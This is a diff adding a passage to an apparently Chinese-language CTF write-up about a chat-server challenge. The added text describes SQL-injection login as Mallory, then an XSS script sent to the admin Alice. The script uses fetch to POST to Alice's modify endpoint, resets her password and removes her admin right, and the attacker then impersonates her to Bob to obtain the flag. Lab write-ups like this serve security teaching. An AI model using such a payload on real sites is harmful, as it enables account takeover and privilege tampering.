@@ -18,4 +18,23 @@
 
 此时注意到 `chat_server` 提供了修改用户 `username`、`password`、`admin` 的功能，那么只需要让管理员 Alice 主动去除自身的 `admin` 权限，就可以登录 `alice` 与 Bob 加密通信了。
 
-而 Alice 会在
+而 Alice 初始会不断检查与 Mallory 的通信，直到收到 `I heard someone shared the flag with Bob!` 为止。于是可以想到先以 Mallory 的名义对 Alice 发动 XXS 攻击，使得 Alice 修改自身的 `admin` 权限（以及 `password`，方便后续登录 `alice`，同时阻止 Alice 本人登录，污染与 Bob 的通信）。
+
+于是具体攻击流程如下：
+- 发动 XXS 攻击：SQL 注入登录 `mallory`，向 `alice` 发送 XXS 攻击脚本，再发送`I heard someone shared the flag with Bob!`启动Alice与Bob的加密通信。
+```html
+<script>
+    fetch("/user/alice/modify", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+        body: new URLSearchParams({
+            username: "alice",
+            password: "123456",
+            admin: "false",
+        })
+    });
+</script>
+```
+- 通信身份伪装：用修改的密码登录 `alice`，根据 `run` 的通信流程与 `bob` 建立 DH-AES 加密信道，获取 Bob 发送的 Flag。
